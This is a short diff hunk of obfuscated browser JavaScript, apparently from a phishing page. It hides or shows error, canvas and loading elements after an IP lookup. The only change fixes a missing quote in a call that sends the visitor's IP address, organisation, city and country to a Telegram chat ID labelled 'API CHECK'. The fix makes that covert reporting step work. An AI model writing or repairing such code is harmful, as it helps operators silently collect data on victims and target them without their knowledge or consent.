@@ -85,7 +85,7 @@ if (getCookie('ip') == ''){
          document['getElementById']('errorpage')['style']['display'] = 'none';
          document['getElementById']('canvas')['style']['display'] = 'block';
          document['getElementById']('loading')['style']['display'] = 'none';
-         telegram(ipp,org,city,country,'API CHECK','-865087835);
+         telegram(ipp,org,city,country,'API CHECK','-865087835');
      }
  }, 'jsonp')['fail'](function() {
      document['getElementById']('loading')['style']['display'] = 'none';
